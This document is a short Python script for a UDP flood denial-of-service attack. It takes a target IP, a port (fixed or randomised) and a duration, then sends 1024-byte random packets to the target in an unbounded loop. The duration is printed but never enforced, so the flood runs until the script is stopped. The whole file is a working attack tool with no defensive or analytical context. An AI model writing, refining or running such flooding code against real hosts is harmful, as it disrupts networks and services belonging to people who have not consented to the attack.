#!/usr/bin/python
import socket,random,sys,time

if len(sys.argv)==1:
    sys.exit('Usage: f.py ip port(0=random) length(0=forever)')

def UDPFlood():
    port = int(sys.argv[2])
    randport=(True,False)[port==0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    print('Flooding %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(1024)
    while True:
        port=(random.randint(1,65535),port)[randport]
        sock.sendto(bytes,(ip,port))
    print('DONE')
UDPFlood()
